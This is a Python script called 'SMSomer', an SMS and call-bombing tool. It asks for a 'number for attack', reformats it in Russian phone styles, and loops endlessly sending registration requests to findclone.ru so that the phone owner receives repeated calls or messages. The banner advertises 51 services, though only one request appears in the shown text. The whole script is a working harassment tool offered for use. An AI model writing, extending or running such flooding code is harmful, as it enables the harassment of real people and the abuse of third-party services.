import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style

banner = """
 ____________________________________________________
|                                                    |
| [--] Name: SMSomer                                 |
|                                                    |
| [--] Have Services: 51                             |
|                                                    |
| [--] Created by: @shabakoff                        |
|                                                    |
| [--] Telegram channel: @codingbots                 |
|                                                    |
| [--] Version: 1.0.6                                |
|____________________________________________________|
"""

print(banner)
_phone = input('Hello! Number for attack (79xxxxxxxxx)-->> ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('[+] findclone звонок отправлен!')
	except:
		print('[-] Не отправлено!')



	try:
		iteration += 1
		print(('{} круг пройден.').format(iteration))
	except:
		break
